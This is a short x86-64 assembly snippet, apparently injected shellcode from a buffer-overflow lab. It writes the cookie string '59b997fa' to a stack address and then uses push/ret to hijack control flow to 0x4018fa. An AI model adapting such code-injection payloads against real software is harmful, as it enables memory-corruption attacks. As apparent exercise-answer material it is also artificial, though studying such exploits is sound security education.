movabsq $0x7ffff7fef700, %rdi
movb $0, 0x8(%rdi)
movabsq $0x6166373939623935, %rax
movq %rax, (%rdi)
push  $0x004018fa
ret
